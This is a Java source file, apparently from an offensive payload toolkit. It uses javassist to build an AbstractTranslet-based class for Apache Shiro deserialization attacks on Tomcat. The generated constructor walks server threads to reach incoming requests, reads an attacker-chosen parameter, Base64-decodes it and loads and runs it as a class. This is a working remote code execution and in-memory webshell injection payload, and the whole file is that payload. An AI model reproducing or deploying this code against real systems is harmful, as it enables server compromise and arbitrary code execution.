package cn.butler.thirdparty.payloads.custom;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;

public class TomcatShiroLoadClassTemplate {
    public static Object[] loadClassDataForTomcatShiro(String parameter) throws Exception{
        //javassist生成字节码,删除重写的俩个方法
        ClassPool pool = ClassPool.getDefault();
        String tmplClazzName = "T" + System.nanoTime();
        CtClass ctClass = pool.makeClass(tmplClazzName);
        if ((ctClass.getDeclaredConstructors()).length != 0) {
            ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
        }
        ctClass.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n" +
            "    java.lang.reflect.Field f = null;\n" +
            "    Class clazz = o.getClass();\n" +
            "    while (clazz != Object.class) {\n" +
            "        try {\n" +
            "            f = clazz.getDeclaredField(s);\n" +
            "            break;\n" +
            "        } catch (NoSuchFieldException e) {\n" +
            "            clazz = clazz.getSuperclass();\n" +
            "        }\n" +
            "    }\n" +
            "    if (f == null) {\n" +
            "        throw new NoSuchFieldException(s);\n" +
            "    }\n" +
            "    f.setAccessible(true);\n" +
            "    return f.get(o);\n" +
            "}", ctClass));
        String cmd = String.format("public InjectMemTool() {\n" +
            "    try {\n" +
            "        Object o;\n" +
            "        String s;\n" +
            "        String code = null;\n" +
            "        boolean done = false;\n" +
            "        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
            "        for (int i = 0; i < ts.length; i++) {\n" +
            "            Thread t = ts[i];\n" +
            "            if (t == null) {\n" +
            "                continue;\n" +
            "            }\n" +
            "            s = t.getName();\n" +
            "            if (!s.contains(\"exec\") && s.contains(\"http\")) {\n" +
            "                o = getFV(t, \"target\");\n" +
            "                if (!(o instanceof Runnable)) {\n" +
            "                    continue;\n" +
            "                }\n" +
            "\n" +
            "                try {\n" +
            "                    o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n" +
            "                } catch (Exception e) {\n" +
            "                    continue;\n" +
            "                }\n" +
            "\n" +
            "                java.util.List ps = (java.util.List) getFV(o, \"processors\");\n" +
            "                for (int j = 0; j < ps.size(); j++) {\n" +
            "                    Object p = ps.get(j);\n" +
            "                    o = getFV(p, \"req\");\n" +
            "\n" +
            "                    Object conreq = o.getClass().getMethod(\"getNote\", new Class[]{int.class}).invoke(o, new Object[]{new Integer(1)});\n" +
            "\n" +
            "                    code = (String) conreq.getClass().getMethod(\"getParameter\", new Class[]{String.class}).invoke(conreq, new Object[]{new String(\"%s\")});\n" +
            "\n" +
            "                    if (code != null && !code.isEmpty()) {\n" +
            "                        byte[] bytecodes = org.apache.shiro.codec.Base64.decode(code);\n" +
            "\n" +
            "                        java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
            "                        defineClassMethod.setAccessible(true);\n" +
            "\n" +
            "                        Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]{bytecodes, new Integer(0), new Integer(bytecodes.length)});\n" +
            "\n" +
            "                        cc.newInstance().equals(conreq);\n" +
            "                        done = true;\n" +
            "                    }\n" +
            "                    if (done) {\n" +
            "                        break;\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "    } catch (Exception e) {\n" +
            "        ;\n" +
            "    }\n" +
            "}",parameter);
        //这里的Evil名称不影响后续的,删除静态代码块,将代码写入空参构造
        ctClass.addConstructor(CtNewConstructor.make(cmd,ctClass));
        //其中EvilByteCodes类捕获异常后无需处理
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        ctClass.getClassFile().setVersionToJava5(); //jdk5编译
        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();
        return new Object[]{tmplClazzName, bytes};
    }
}
